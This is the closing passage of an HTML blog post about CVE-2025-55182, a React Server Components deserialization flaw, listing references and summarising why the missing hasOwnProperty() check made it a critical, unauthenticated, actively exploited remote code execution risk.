href=https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/>Palo Alto Unit 42 Analysis</a></li><li><a href=https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html>Trend Micro Technical Analysis</a></li><li><a href=https://www.joshwcomeau.com/react/server-components/>Making Sense of React Server Components</a></li></ul><hr><h2 id=conclusion>Conclusion</h2><p>CVE-2025-55182 demonstrates how a single missing security check can create a maximum-severity vulnerability affecting millions of applications. The <code>hasOwnProperty()</code> function exists specifically to distinguish between own and inherited properties, yet its absence in React&rsquo;s deserialization code created a critical RCE pathway.</p><p>This vulnerability is particularly dangerous because:</p><ul><li><strong>It affects the framework layer:</strong> Developers using React correctly were still vulnerable</li><li><strong>It requires no authentication:</strong> Any attacker can exploit it with a single HTTP request</li><li><strong>It&rsquo;s in default configuration:</strong> Fresh <code>create-next-app</code> projects are immediately exploitable</li><li><strong>It&rsquo;s actively exploited:</strong> Real-world attacks are happening now</li></ul></content><p></p></main><footer><footer><p style=text-align:center;margin-bottom:.5rem;color:#8f0000!important>trying.</p></footer></footer></body></html>